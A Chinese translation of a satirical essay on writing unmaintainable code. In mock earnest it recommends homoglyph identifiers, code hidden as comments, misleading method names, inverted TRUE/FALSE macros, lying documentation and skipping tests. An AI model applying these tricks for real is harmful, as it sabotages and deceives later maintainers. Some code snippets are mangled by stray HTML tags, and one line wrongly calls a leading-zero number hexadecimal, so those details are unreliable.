<p>编写无法维护代码的技巧的重中之重是变量和方法命名的艺术。如何命名是和编译器无关的。这就让你有巨大的自由度去利用它们迷惑维护代码的程序员。</p>
<p>妙用 宝宝起名大全<br>买本宝宝起名大全，你就永远不缺变量名了。比如 Fred 就是个好名字，而且键盘输入它也省事。如果你就想找一些容易输入的变量名，可以试试 adsf 或者 aoeu之类。<br>单字母变量名<br>如果你给变量起名为a,b,c，用简单的文本编辑器就没法搜索它们的引用。而且，没人能猜到它们的含义。<br>创造性的拼写错误<br>如果你必须使用描述性的变量和函数名，那就把它们都拼错。还可以把某些函数和变量名拼错，再把其他的拼对(例如 SetPintleOpening 和 SetPintalClosing) ，我们就能有效地将grep或IDE搜索技术玩弄于股掌之上。这招超级管用。还可以混淆不同语言（比如colour – 英国英语，和 color – 美国英语)。<br>抽象<br>在命名函数和变量的时候，充分利用抽象单词，例如 it, everything, data, handle, stuff, do, routine, perform 和数字，例如 e.g. routineX48, PerformDataFunction, DoIt, HandleStuff 还有 do_args_method。<br>首字母大写的缩写<br>用首字母大写缩写（比如GNU 代表 GNU’s Not Unix) 使代码简洁难懂。真正的汉子(无论男女)从来不说明这种缩写的含义，他们生下来就懂。<br>辞典大轮换<br>为了打破沉闷的编程气氛，你可以用一本辞典来查找尽量多的同义词。例如 display, show, present。在注释里含糊其辞地暗示这些命名之间有细微的差别，其实根本没有。不过，如果有两个命名相似的函数真的有重大差别，那倒是一定要确保它们用相同的单词来命名(例如，对于 “写入文件”, “在纸上书写” 和 “屏幕显示” 都用 print 来命名)。 在任何情况下都不要屈服于编写明确的项目词汇表这种无理要求。你可以辩解说，这种要求是一种不专业的行为，它违反了结构化设计的信息隐藏原则。<br>首字母大写<br>随机地把单词中间某个音节的首字母大写。例如 ComputeReSult()。<br>重用命名<br>在语言规则允许的地方，尽量把类、构造器、方法、成员变量、参数和局部变量都命名成一样。更高级的技巧是在{}块中重用局部变量。这样做的目的是迫使维护代码的程序员认真检查每个示例的范围。特别是在Java代码中，可以把普通方法伪装成构造器。<br>使用非英语字母<br>在命名中偷偷使用不易察觉的非英语字母，例如<br>typedef struct { int i; } ínt;<br>看上去没啥不对是吧？嘿嘿嘿…这里的第二个 ínt 的 í 实际上是东北欧字母，并不是英语中的 i 。在简单的文本编辑器里，想看出这一点点区别几乎是不可能的。<br>巧妙利用编译器对于命名长度的限制<br>如果编译器只区分命名的前几位，比如前8位，那么就把后面的字母写得不一样。比如，其实是同一个变量，有时候写成 var_unit_update() ，有时候又写成 var_unit_setup()，看起来是两个不同的函数调用。而在编译的时候，它们其实是同一个变量 var_unit。<br>下划线，一位真正的朋友<br>可以拿 _ 和 __ 作为标示符。<br>混合多语言<br>随机地混用两种语言（人类语言或计算机语言都行）。如果老板要求使用他指定的语言，你就告诉他你用自己的语言更有利于组织你的思路，万一这招不管用，就去控诉这是语言歧视，并威胁起诉老板要求巨额精神损失赔偿。<br>扩展 ASCII 字符<br>扩展 ASCII 字符用于变量命名是完全合法的，包括 ß, Ð, 和 ñ 等。在简单的文本编辑器里，除了拷贝/粘贴，基本上没法输入。<br>其他语言的命名<br>使用外语字典作为变量名的来源。例如，可以用德语单词 punkt 代替 point。除非维护代码的程序员也像你一样熟练掌握了德语. 不然他就只能尽情地在代码中享受异域风情了。<br>数学命名<br>用数学操作符的单词来命名变量。例如：<br>openParen = (slash + asterix) / equals;<br>(左圆括号 = (斜杠 + 星号)/等号;)<br>令人眩晕的命名<br>用带有完全不相关的感情色彩的单词来命名变量。例如：<br>marypoppins = (superman + starship) / god;<br>(欢乐满人间 = (超人 + 星河战队)/上帝;)<br>这一招可以让阅读代码的人陷入迷惑之中，因为他们在试图想清楚这些命名的逻辑时，会不自觉地联系到不同的感情场景里而无法自拔。<br>何时使用 i<br>永远不要把 i 用作最内层的循环变量。 用什么命名都行，就是别用i。把 i 用在其他地方就随便了，用作非整数变量尤其好。<br>惯例 – 明修栈道，暗度陈仓<br>忽视 Java 编码惯例，Sun 就是这样做的。幸运的是，你违反了它编译器也不会打小报告。这一招的目的是搞出一些在某些特殊情况下有细微差别的名字来。如果你被强迫遵循驼峰法命名，你还是可以在某些模棱两可的情况下颠覆它。例如，inputFilename 和 inputfileName 两个命名都可以合法使用。在此基础上自己发明一套复杂到变态的命名惯例，然后就可以痛扁其他人，说他们违反了惯例。<br>小写的 l 看上去很像数字 1<br>用小写字母 l 标识 long 常数。例如 10l 更容易被误认为是 101 而不是 10L 。 禁用所有能让人准确区分 uvw wW gq9 2z 5s il17|!j oO08 `’” ;,. m nn rn {[()]} 的字体。要做个有创造力的人。<br>把全局命名重用为私有<br>在A 模块里声明一个全局数组，然后在B 模块的头文件里在声明一个同名的私有数组，这样看起来你在B 模块里引用的是那个全局数组，其实却不是。不要在注释里提到这个重复的情况。<br>误导性的命名<br>让每个方法都和它的名字蕴含的功能有一些差异。例如，一个叫 isValid(x)的方法在判断完参数x的合法性之后，还顺带着把它转换成二进制并保存到数据库里。<br>伪装<br>当一个bug需要越长的时间才会暴露，它就越难被发现。</p>
<ul>
<li>Roedy Green（本文作者）</li>
</ul>
<p>编写无法维护代码的另一大秘诀就是伪装的艺术，即隐藏它或者让它看起来像其他东西。很多招式有赖于这样一个事实：编译器比肉眼或文本编辑器更有分辨能力。下面是一些伪装的最佳招式。<br>把代码伪装成注释，反之亦然<br>下面包括了一些被注释掉的代码，但是一眼看去却像是正常代码。<br>for(j=0; j&lt;array_len; j+ =8)<br>{<br>total += array[j+0 ];<br>total += array[j+1 ];<br>total += array[j+2 ]; /<em> Main body of<br>total += array[j+3]; </em> loop is unrolled<br>total += array[j+4]; <em> for greater speed.<br>total += array[j+5]; </em>/<br>total += array[j+6 ];<br>total += array[j+7 ];<br>}<br>如果不是用绿色标出来，你能注意到这三行代码被注释掉了么？<br>用连接符隐藏变量<br>对于下面的定义</p>
<p>#define local_var xy_z<br>可以把 “xy_z” 打散到两行里：</p>
<p>#define local_var xy\<br>_z // local_var OK<br>这样全局搜索 xy_z 的操作在这个文件里就一无所获了。 对于 C 预处理器来说，第一行最后的 “\” 表示继续拼接下一行的内容。<br>文档<br>任何傻瓜都能说真话，而要把谎编圆则需要相当的智慧。</p>
<ul>
<li>Samuel Butler (1835 - 1902)<br>不正确的文档往往比没有文档还糟糕。</li>
<li>Bertrand Meyer<br>既然计算机是忽略注释和文档的，你就可以在里边堂而皇之地编织弥天大谎，让可怜的维护代码的程序员彻底迷失。<br>在注释中撒谎<br>实际上你不需要主动地撒谎，只要没有及时保持注释和代码更新的一致性就可以了。<br>只记录显而易见的东西<br>往代码里掺进去类似于 /<em> 给 i 加 1 </em>/ 这样的注释，但是永远不要记录包或者方法的整体设计这样的干货。<br>记录 How 而不是 Why<br>只解释一个程序功能的细节，而不是它要完成的任务是什么。这样的话，如果出现了一个bug，修复者就搞不清这里的代码应有的功能。<br>该写的别写<br>比如你在开发一套航班预定系统，那就要精心设计，让它在增加另一个航空公司的时候至少有25处代码需要修改。永远不要在文档里说明要修改的位置。后来的开发人员要想修改你的代码门都没有，除非他们能把每一行代码都读懂。<br>计量单位<br>永远不要在文档中说明任何变量、输入、输出或参数的计量单位，如英尺、米、加仑等。计量单位对数豆子不是太重要，但在工程领域就相当重要了。同理，永远不要说明任何转换常量的计量单位，或者是它的取值如何获得。要想让代码更乱的话，你还可以在注释里写上错误的计量单位，这是赤裸裸的欺骗，但是非常有效。如果你想做一个恶贯满盈的人，不妨自己发明一套计量单位，用自己或某个小人物的名字命名这套计量单位，但不要给出定义。万一有人挑刺儿，你就告诉他们，你这么做是为了把浮点数运算凑成整数运算而进行的转换。<br>坑<br>永远不要记录代码中的坑。如果你怀疑某个类里可能有bug，天知地知你知就好。如果你想到了重构或重写代码的思路，看在老天爷的份上，千万别写出来。切记电影《小鹿斑比》里那句台词 “如果你不能说好听的话，那就什么也不要说。”。万一这段代码的原作者看到你的注释怎么办？万一老板看到了怎么办？万一客户看到了怎么办？搞不好最后你自己被解雇了。一句”这里需要修改“的匿名注释就好多了，尤其是当看不清这句注释指的是哪里需要修改的情况下。切记难得糊涂四个字，这样大家都不会感觉受到了批评。<br>说明变量<br>永远不要 对变量声明加注释。有关变量使用的方式、边界值、合法值、小数点后的位数、计量单位、显示格式、数据录入规则等等，后继者完全可以自己从程序代码中去理解和整理嘛。如果老板强迫你写注释，就把方法体代码混进去，但绝对不要对变量声明写注释，即使是临时变量！<br>在注释里挑拨离间<br>为了阻挠任何雇佣外部维护承包商的倾向，可以在代码中散布针对其他同行软件公司的攻击和抹黑，特别是可能接替你工作的其中任何一家。例如：<br>/<em> 优化后的内层循环<br>这套技巧对于SSI软件服务公司的那帮蠢材来说太高深了，他们只会<br>用 &lt;math.h&gt; 里的笨例程，消耗50倍的内存和处理时间。
</em>/<br>class clever_SSInc<br>{<br>.. .<br>}<br>可能的话，除了注释之外，这些攻击抹黑的内容也要掺到代码里的重要部分，这样如果管理层想清理掉这些攻击性的言论然后发给外部承包商去维护，就会破坏代码结构。<br>程序设计<br>编写无法维护代码的基本规则就是：在尽可能多的地方，以尽可能多的方式表述每一个事实。</li>
<li>Roedy Green<br>编写可维护代码的关键因素是只在一个地方表述应用里的一个事实。如果你的想法变了，你也只在一个地方修改，这样就能保证整个程序正常工作。所以，编写无法维护代码的关键因素就是反复地表述同一个事实，在尽可能多的地方，以尽可能多的方式进行。令人高兴的是，像Java这样的语言让编写这种无法维护代码变得非常容易。例如，改变一个被引用很多的变量的类型几乎是不可能的，因为所有造型和转换功能都会出错，而且关联的临时变量的类型也不合适了。而且，如果变量值要在屏幕上显示，那么所有相关的显示和数据录入代码都必须一一找到并手工进行修改。类似的还有很多，比如由C和Java组成的Algol语言系列，Abundance甚至Smalltalk对于数组等结构的处理，都是大有可为的。<br>Java 造型<br>Java的造型机制是上帝的礼物。你可以问心无愧地使用它，因为Java语言本身就需要它。每次你从一个Collection 里获取一个对象，你都必须把它造型为原始类型。这样这个变量的类型就必须在无数地方表述。如果后来类型变了，所有的造型都要修改才能匹配。如果倒霉的维护代码的程序员没有找全（或者修改太多），编译器能不能检测到也不好说。类似的，如果变量类型从short 变成 int，所有匹配的造型也都要从(short) 改成 (int)。<br>利用Java的冗余<br>Java要求你给每个变量的类型写两次表述。 Java 程序员已经习惯了这种冗余，他们不会注意到你的两次表述有细微的差别，例如<br>Bubblegum b = new Bubblegom();<br>不幸的是 ++ 操作符的盛行让下面这种伪冗余代码得手的难度变大了：<br>swimmer = swimner + 1;<br>永远不做校验<br>永远不要对输入数据做任何的正确性或差异性检查。这样能表现你对公司设备的绝对信任，以及你是一位信任所有项目伙伴和系统管理员的团队合作者。总是返回合理的值，即使数据输入有问题或者错误。<br>有礼貌，无断言<br>避免使用 assert() 机制，因为它可能把三天的debug盛宴变成10分钟的快餐。<br>避免封装<br>为了提高效率，不要使用封装。方法的调用者需要所有能得到的外部信息，以便了解方法的内部是如何工作的。<br>复制粘贴修改<br>以效率的名义，使用 复制+粘贴+修改。这样比写成小型可复用模块效率高得多。在用代码行数衡量你的进度的小作坊里，这招尤其管用。<br>使用静态数组<br>如果一个库里的模块需要一个数组来存放图片，就定义一个静态数组。没人会有比512 X 512 更大的图片，所以固定大小的数组就可以了。为了最佳精度，就把它定义成 double 类型的数组。<br>傻瓜接口<br>编写一个名为 “WrittenByMe” 之类的空接口，然后让你的所有类都实现它。然后给所有你用到的Java 内置类编写包装类。这里的思想是确保你程序里的每个对象都实现这个接口。最后，编写所有的方法，让它们的参数和返回类型都是这个 WrittenByMe。这样就几乎不可能搞清楚某个方法的功能是什么，并且所有类型都需要好玩的造型方法。更出格的玩法是，让每个团队成员编写它们自己的接口(例如 WrittenByJoe)，程序员用到的任何类都要实现他自己的接口。这样你就可以在大量无意义接口中随便找一个来引用对象了。<br>巨型监听器<br>永远不要为每个组件创建分开的监听器。对所有按钮总是用同一个监听器，只要用大量的if…else 来判断是哪一个按钮被点击就行了。<br>好事成堆TM<br>狂野地使用封装和OO思想。例如<br>myPanel.add( getMyButton() );<br>private JButton getMyButton()<br>{<br>return myButton;<br>}<br>这段很可能看起来不怎么好笑。别担心，只是时候未到而已。<br>友好的朋友<br>在C++ 里尽量多使用friend声明。再把创建类的指针传递给已创建类。现在你不用浪费时间去考虑接口了。另外，你应该用上关键字private 和 protected 来表明你的类封装得很好。<br>使用三维数组<br>大量使用它们。用扭曲的方式在数组之间移动数据，比如，用arrayA里的行去填充arrayB的列。这么做的时候，不管三七二十一再加上1的偏移值，这样很灵。让维护代码的程序员抓狂去吧。<br>混合与匹配<br>存取方法和公共变量神马的都要给他用上。这样的话，你无需调用存取器的开销就可以修改一个对象的变量，还能宣称这个类是个”Java Bean”。对于那些试图添加日志函数来找出改变值的源头的维护代码的程序员，用这一招来迷惑他尤其有效。<br>没有秘密!<br>把每个方法和变量都声明为 public。毕竟某个人某天可能会需要用到它。一旦方法被声明为public 了，就很难缩回去。对不？这样任何它覆盖到的代码都很难修改了。它还有个令人愉快的副作用，就是让你看不清类的作用是什么。如果老板质问你是不是疯了，你就告诉他你遵循的是经典的透明接口原则。<br>全堆一块<br>把你所有的没用的和过时的方法和变量都留在代码里。毕竟说起来，既然你在1976年用过一次，谁知道你啥时候会需要再用到呢？当然程序是改了，但它也可能会改回来嘛，你”不想要重新发明轮子”（领导们都会喜欢这样的口气）。如果你还原封不动地留着这些方法和变量的注释，而且注释写得又高深莫测，甭管维护代码的是谁，恐怕都不敢对它轻举妄动。<br>就是 Final<br>把你所有的叶子类都声明为 final。毕竟说起来，你在项目里的活儿都干完了，显然不会有其他人会通过扩展你的类来改进你的代码。这种情况甚至可能有安全漏洞。 java.lang.String 被定义成 final 也许就是这个原因吧？如果项目组其他程序员有意见，告诉他们这样做能够提高运行速度。<br>避免布局<br>永远不要用到布局。当维护代码的程序员想增加一个字段，他必须手工调整屏幕上显示所有内容的绝对坐标值。如果老板强迫你使用布局，那就写一个巨型的 GridBagLayout 并在里面用绝对坐标进行硬编码。<br>全局变量，怎么强调都不过分<br>如果上帝不愿意我们使用全局变量，他就不会发明出这个东西。不要让上帝失望，尽量多使用全局变量。每个函数最起码都要使用和设置其中的两个，即使没有理由也要这么做。毕竟，任何优秀的维护代码的程序员都会很快搞清楚这是一种侦探工作测试，有利于让他们从笨蛋中脱颖而出。<br>再一次说说全局变量<br>全局变量让你可以省去在函数里描述参数的麻烦。充分利用这一点。在全局变量中选那么几个来表示对其他全局变量进行操作的类型。<br>局部变量<br>永远不要用局部变量。在你感觉想要用的时候，把它改成一个实例或者静态变量，并无私地和其他方法分享它。这样做的好处是，你以后在其他方法里写类似声明的时候会节省时间。C++程序员可以百尺竿头更进一步，把所有变量都弄成全局的。<br>配置文件<br>配置文件通常是以 关键字 = 值 的形式出现。在加载时这些值被放入 Java 变量中。最明显的迷惑技术就是把有细微差别的名字用于关键字和Java 变量.甚至可以在配置文件里定义运行时根本不会改变的常量。参数文件变量和简单变量比，维护它的代码量起码是后者的5倍。<br>子类<br>对于编写无法维护代码的任务来说，面向对象编程的思想简直是天赐之宝。如果你有一个类，里边有10个属性（成员/方法），可以考虑写一个基类，里面只有一个属性，然后产生9层的子类，每层增加一个属性。等你访问到最终的子类时，你才能得到全部10个属性。如果可能，把每个类的声明都放在不同的文件里。<br>编码迷局<br>迷惑 C<br>从互联网上的各种混乱C 语言竞赛中学习，追随大师们的脚步。<br>追求极致<br>总是追求用最迷惑的方式来做普通的任务。例如，要用数组来把整数转换为相应的字符串，可以这么做：<br>char <em>p;<br>switch (n)<br>{<br>case 1:<br>  p = “one”;<br>  if (0)<br>case 2:<br>  p = “two”;<br>  if (0)<br>case 3:<br>  p = “three”;<br>  printf(“%s”, p);<br>  break;<br>}<br>一致性的小淘气<br>当你需要一个字符常量的时候，可以用多种不同格式： ‘ ‘, 32, 0x20, 040。在C或Java里10和010是不同的数（0开头的表示16进制），你也可以充分利用这个特性。<br>造型<br>把所有数据都以 void </em> 形式传递，然后再造型为合适的结构。不用结构而是通过位移字节数来造型也很好玩。<br>嵌套 Switch<br>Switch 里边还有 Switch，这种嵌套方式是人类大脑难以破解的。<br>利用隐式转化<br>牢记编程语言中所有的隐式转化细节。充分利用它们。数组的索引要用浮点变量，循环计数器用字符，对数字执行字符串函数调用。不管怎么说，所有这些操作都是合法的，它们无非是让源代码更简洁而已。任何尝试理解它们的维护者都会对你感激不尽，因为他们必须阅读和学习整个关于隐式数据类型转化的章节，而这个章节很可能是他们来维护你的代码之前完全忽略了的。<br>分号!<br>在所有语法允许的地方都加上分号，例如：<br>if(a);<br>else;<br>{<br>int d;<br>d = c;<br>}<br>;<br>使用八进制数<br>把八进制数混到十进制数列表里，就像这样：<br>array = new int []<br>{<br>111,<br>120,<br>013,<br>121,<br>};<br>嵌套<br>尽可能深地嵌套。优秀的程序员能在一行代码里写10层()，在一个方法里写20层{}。<br>C数组<br>C编译器会把 myArray[i] 转换成 <em>(myArray + i)，它等同于 </em>(i + myArray) 也等同于 i[myArray]。 高手都知道怎么用好这个招。可以用下面的函数来产生索引，这样就把代码搞乱了：<br>int myfunc(int q, int p) { return p%q; }<br>…<br>myfunc(6291, 8)[Array];</li>
</ul>
<p>遗憾的是，这一招只能在本地C类里用，Java 还不行。</p>
<p>放长线钓大鱼<br>一行代码里堆的东西越多越好。这样可以省下临时变量的开销，去掉换行和空格还可以缩短源文件大小。记住，要去掉运算符两边的空格。优秀的程序员总是能突破某些编辑器对于255个字符行宽的限制。<br>异常<br>我这里要向你传授一个编程中鲜为人知的秘诀。异常是个讨厌的东西。良好的代码永远不会出错，所以异常实际上是不必要的。不要把时间浪费在这上面。子类异常是给那些知道自己代码会出错的低能儿用的。在整个应用里，你只用在main()里放一个try/catch，里边直接调用 System.exit()就行了。在每个方法头要贴上标准的抛出集合定义，到底会不会抛出异常你就不用管了。<br>使用异常的时机<br>在非异常条件下才要使用异常。比如终止循环就可以用 ArrayIndexOutOfBoundsException。还可以从异常里的方法返回标准的结果。<br>狂热奔放地使用线程<br>如题。<br>测试<br>在程序里留些bug，让后继的维护代码的程序员能做点有意思的事。精心设计的bug是无迹可寻的，而且谁也不知道它啥时候会冒出来。要做到这一点，最简单的办法的就是不要测试代码。<br>永不测试<br>永远不要测试负责处理错误、当机或操作系故障的任何代码。反正这些代码永远也不会执行，只会拖累你的测试。还有，你怎么可能测试处理磁盘错误、文件读取错误、操作系统崩溃这些类型的事件呢？为啥你要用特别不稳定的计算机或者用测试脚手架来模拟这样的环境？现代化的硬件永远不会崩溃，谁还愿意写一些仅仅用于测试的代码？这一点也不好玩。如果用户抱怨，你就怪到操作系统或者硬件头上。他们永远不会知道真相的。<br>永远不要做性能测试<br>嘿，如果软件运行不够快，只要告诉客户买个更快的机器就行了。如果你真的做了性能测试，你可能会发现一个瓶颈，这会导致修改算法，然后导致整个产品要重新设计。谁想要这种结果？而且，在客户那边发现性能问题意味着你可以免费到外地旅游。你只要备好护照和最新照片就行了。<br>永远不要写任何测试用例<br>永远不要做代码覆盖率或路径覆盖率测试。自动化测试是给那些窝囊废用的。搞清楚哪些特性占到你的例程使用率的90%，然后把90%的测试用在这些路径上。毕竟说起来，这种方法可能只测试到了大约你代码的60%，这样你就节省了40%的测试工作。这能帮助你赶上项目后端的进度。等到有人发现所有这些漂亮的“市场特性”不能正常工作的时候，你早就跑路了。一些有名的大软件公司就是这样测试代码的，所以你也应该这样做。如果因为某种原因你还没走，那就接着看下一节。<br>测试是给懦夫用的<br>勇敢的程序员会跳过这个步骤。太多程序员害怕他们的老板，害怕丢掉工作，害怕客户的投诉邮件，害怕遭到起诉。这种恐惧心理麻痹了行动，降低了生产率。有科学研究成果表明，取消测试阶段意味着经理有把握能提前确定交付时间，这对于规划流程显然是有利的。消除了恐惧心理，创新和实验之花就随之绽放。程序员的角色是生产代码，调试工作完全可以由技术支持和遗留代码维护组通力合作来进行。<br>如果我们对自己的编程能力有充分信心，那么测试就没有必要了。如果我们逻辑地看待这个问题，随便一个傻瓜都能认识到测试根本都不是为了解决技术问题，相反，它是一种感性的信心问题。针对这种缺乏信心的问题，更有效的解决办法就是完全取消测试，送我们的程序员去参加自信心培训课程。毕竟说起来，如果我们选择做测试，那么我们就要测试每个程序的变更，但其实我们只需要送程序员去一次建立自信的培训课就行了。很显然这么做的成本收益是相当可观的。</p>
<p>编程语言的选择<br>计算机语言正在逐步进化，变得更加傻瓜化。使用最新的语言是不人性的。尽可能坚持使用你会用的最老的语言，先考虑用穿孔纸带，不行就用汇编，再不行用FORTRAN 或者 COBOL，再不行就用C 还有 BASIC，实在不行再用 C++。</p>
<p>FØRTRAN<br>用 FORTRAN 写所有的代码。如果老板问你为啥，你可以回答说有很多它非常有用的库，你用了可以节约时间。不过，用 FORTRAN 写出可维护代码的概率是0，所以，要达到不可维护代码编程指南里的要求就容易多了。<br>用 ASM<br>把所有的通用工具函数都转成汇编程序。<br>用 QBASIC<br>所有重要的库函数都要用 QBASIC 写，然后再写个汇编的封包程序来处理 large 到 medium 的内存模型映射。<br>内联汇编<br>在你的代码里混杂一些内联的汇编程序，这样很好玩。这年头几乎没人懂汇编程序了。只要放几行汇编代码就能让维护代码的程序员望而却步。<br>宏汇编调用C<br>如果你有个汇编模块被C调用，那就尽可能经常从汇编模块再去调用C，即使只是出于微不足道的用途，另外要充分利用 goto, bcc 和其他炫目的汇编秘籍。<br>与他人共事之道<br>老板才是真行家<br>如果你的老板认为他20年的 FORTRAN 编程经验对于现代软件开发具有很高的指导价值，你务必严格采纳他的所有建议。投桃报李，你的老板也会信任你。这会对你的职业发展有利。你还会从他那里学到很多搞乱程序代码的新方法。<br>颠覆技术支持<br>确保代码中到处是bug的有效方法是永远不要让维护代码的程序员知道它们。这需要颠覆技术支持工作。永远不接电话。使用自动语音答复“感谢拨打技术支持热线。需要人工服务请按1，或在嘀声后留言。”，请求帮助的电子邮件必须忽略，不要给它分配服务追踪号。对任何问题的标准答复是“我估计你的账户被锁定了，有权限帮你恢复的人现在不在。”<br>沉默是金<br>永远不要对下一个危机保持警觉。如果你预见到某个问题可能会在一个固定时间爆发，摧毁西半球的全部生命，不要公开讨论它。不要告诉朋友、同事或其他你认识的有本事的人。在任何情况下都不要发表任何可能暗示到这种新的威胁的内容。只发送一篇正常优先级的、语焉不详的备忘录给管理层，保护自己免遭秋后算账。如果可能的话，把这篇稀里糊涂的信息作为另外一个更紧急的业务问题的附件。这样就可以心安理得地休息了，你知道将来你被强制提前退休之后一段时间，他们又会求着你回来，并给你对数级增长的时薪！<br>每月一书俱乐部<br>加入一个计算机每月一书俱乐部。选择那些看上去忙着写书不可能有时间真的去写代码的作者。去书店里找一些有很多图表但是没有代码例子的书。浏览一下这些书，从中学会一些迂腐拗口的术语，用它们就能唬住那些自以为是的维护代码的程序员。你的代码肯定会给他留下深刻印象。如果人们连你写的术语都理解不了，他们一定会认为你非常聪明，你的算法非常深奥。不要在你的算法说明里作任何朴素的类比。<br>自立门户<br>你一直想写系统级的代码。现在机会来了。忽略标准库， 编写你自己的标准，这将会是你简历中的一个亮点。<br>推出你自己的 BNF 范式<br>总是用你自创的、独一无二的、无文档的BNF范式记录你的命令语法。永远不要提供一套带注解的例子（合法命令和非法命令之类）来解释你的语法体系。那样会显得完全缺乏学术严谨性。确保没有明显的方式来区分终结符和中间符号。永远不要用字体、颜色、大小写和其他任何视觉提示帮助读者分辨它们。在你的 BNF 范式用和命令语言本身完全一样的标点符号，这样读者就永远无法分清一段 (…), […], {…} 或 “…” 到底是你在命令行里真正输入的，还是想提示在你的BNF 范式里哪个语法元素是必需的、可重复的、或可选的。不管怎么样，如果他们太笨，搞不清你的BNF 范式的变化，就没资格使用你的程序。<br>推出你自己的内存分配<br>地球人儿都知道，调试动态存储是复杂和费时的。与其逐个类去确认它没有内存溢出，还不如自创一套存储分配机制呢。其实它无非是从一大片内存中 malloc 一块空间而已。用不着释放内存，让用户定期重启动系统，这样不就清除了堆么。重启之后系统需要追踪的就那么一点东西，比起解决所有的内存泄露简单得不知道到哪里去了！而且，只要用户记得定期重启系统，他们也永远不会遇到堆空间不足的问题。一旦系统被部署，你很难想象他们还能改变这个策略。<br>其他杂七杂八的招<br>如果你给某人一段程序，你会让他困惑一天；如果你教他们如何编程，你会让他困惑一辈子。 – Anonymous</p>
<p>不要重编译<br>让我们从一条可能是有史以来最友好的技巧开始：把代码编译成可执行文件。如果它能用，就在源代码里做一两个微小的改动 – 每个模块都照此办理。但是不要费劲巴拉地再编译一次了。 你可以留着等以后有空而且需要调试的时候再说。多年以后，等可怜的维护代码的程序员更改了代码之后发现出错了，他会有一种错觉，觉得这些肯定是他自己最近修改的。这样你就能让他毫无头绪地忙碌很长时间。<br>挫败调试工具<br>对于试图用行调试工具追踪来看懂你的代码的人，简单的一招就能让他狼狈不堪，那就是把每一行代码都写得很长。特别要把 then 语句 和 if 语句放在同一行里。他们无法设置断点。他们也无法分清在看的分支是哪个 if 里的。<br>公制和美制<br>在工程方面有两种编码方式。一种是把所有输入都转换为公制（米制）计量单位，然后在输出的时候自己换算回各种民用计量单位。另一种是从头到尾都保持各种计量单位混合在一起。总是选择第二种方式，这就是美国之道！<br>持续改进<br>要持续不懈地改进。要常常对你的代码做出“改进”，并强迫用户经常升级 – 毕竟没人愿意用一个过时的版本嘛。即便他们觉得他们对现有的程序满意了，想想看，如果他们看到你又“完善“了它，他们会多么开心啊！不要告诉任何人版本之间的差别，除非你被逼无奈 – 毕竟，为什么要告诉他们本来永远也不会注意到的一些bug呢？<br>”关于“<br>”关于“一栏应该只包含程序名、程序员姓名和一份用法律用语写的版权声明。理想情况下，它还应该链接到几 MB 的代码，产生有趣的动画效果。但是，里边永远不要包含程序用途的描述、它的版本号、或最新代码修改日期、或获取更新的网站地址、或作者的email地址等。这样，所有的用户很快就会运行在不同的版本上，在安装N+1版之前就试图安装N+2版。<br>变更<br>在两个版本之间，你能做的变更自然是多多益善。你不会希望用户年复一年地面对同一套老的接口或用户界面，这样会很无聊。最后，如果你能在用户不注意的情况下做出这些变更，那就更好了 – 这会让他们保持警惕，戒骄戒躁。<br>无需技能<br>写无法维护代码不需要多高的技能。喊破嗓子不如甩开膀子，不管三七二十一开始写代码就行了。记住，管理层还在按代码行数考核生产率，即使以后这些代码里的大部分都得删掉。<br>只带一把锤子<br>一招鲜吃遍天，轻装前进。如果你手头只有一把锤子，那么所有的问题都是钉子。<br>规范体系<br>有可能的话，忽略当前你的项目所用语言和环境中被普罗大众所接受的编程规范。比如，编写基于MFC 的应用时，就坚持使用STL 编码风格。<br>翻转通常的 True False 惯例<br>把常用的 true 和 false 的定义反过来用。这一招听起来平淡无奇，但是往往收获奇效。你可以先藏好下面的定义：</p>
<p>#define TRUE 0</p>
<p>#define FALSE 1<br>把这个定义深深地藏在代码中某个没人会再去看的文件里不易被发现的地方，然后让程序做下面这样的比较<br>if ( var == TRUE )<br>if ( var != FALSE )<br>某些人肯定会迫不及待地跳出来“修正”这种明显的冗余，并且在其他地方照着常规去使用变量var：<br>if ( var )<br>还有一招是为 TRUE 和 FALSE赋予相同的值，虽然大部分人可能会看穿这种骗局。给它们分别赋值 1 和 2 或者 -1 和 0 是让他们瞎忙乎的方式里更精巧的，而且这样做看起来也不失对他们的尊重。你在Java 里也可以用这一招，定义一个叫 TRUE 的静态常量。在这种情况下，其他程序员更有可能怀疑你干的不是好事，因为Java里已经有了内建的标识符 true。<br>第三方库<br>在你的项目里引入功能强大的第三方库，然后不要用它们。潜规则就是这样，虽然你对这些好的工具仍然一无所知，却还是可以在你简历的“其他工具”一节中写上这些没用过的库。<br>不要用库<br>假装不知道有些库已经直接在你的开发工具中引入了。如果你用VC++编程，忽略MFC 或 STL 的存在，手工编写所有字符串和数组的实现；这样有助于保持你的指针技术，并自动阻止任何扩展代码功能的企图。<br>创建一套Build顺序<br>把这套顺序规则做得非常晦涩，让维护者根本无法编译任何他的修改代码。秘密保留 SmartJ ，它会让 make脚本形同废物。类似地，偷偷地定义一个 javac 类，让它和编译程序同名。说到大招，那就是编写和维护一个定制的小程序，在程序里找到需要编译的文件，然后通过直接调用 sun.tools.javac.Main 编译类来进行编译。<br>Make 的更多玩法<br>用一个 makefile-generated-batch-file 批处理文件从多个目录复制源文件，文件之间的覆盖规则在文档中是没有的。这样，无需任何炫酷的源代码控制系统，就能实现代码分支，并阻止你的后继者弄清哪个版本的 DoUsefulWork() 才是他需要修改的那个。<br>搜集编码规范<br>尽可能搜集所有关于编写可维护代码的建议，例如 SquareBox 的建议 ，然后明目张胆地违反它们。<br>规避公司的编码规则<br>某些公司有严格的规定，不允许使用数字标识符，你必须使用预先命名的常量。要挫败这种规定背后的意图太容易了。比如，一位聪明的 C++ 程序员是这么写的：</p>
<p>#define K_ONE 1</p>
<p>#define K_TWO 2</p>
<p>#define K_THOUSAND 999<br>编译器警告<br>一定要保留一些编译器警告。在 make 里使用 “-” 前缀强制执行，忽视任何编译器报告的错误。这样，即使维护代码的程序员不小心在你的源代码里造成了一个语法错误，make 工具还是会重新把整个包build 一遍，甚至可能会成功！而任何程序员要是手工编译你的代码，看到屏幕上冒出一堆其实无关紧要的警告，他们肯定会觉得是自己搞坏了代码。同样，他们一定会感谢你让他们有找错的机会。学有余力的同学可以做点手脚让编译器在打开编译错误诊断工具时就没法编译你的程序。当然了，编译器也许能做一些脚本边界检查，但是真正的程序员是不用这些特性的，所以你也不该用。既然你用自己的宝贵时间就能找到这些精巧的bug，何必还多此一举让编译器来检查错误呢？<br>把 bug 修复和升级混在一起<br>永远不要推出什么“bug 修复”版本。一定要把 bug 修复和数据库结构变更、复杂的用户界面修改，还有管理界面重写等混在一起。那样的话，升级就变成一件非常困难的事情，人们会慢慢习惯 bug 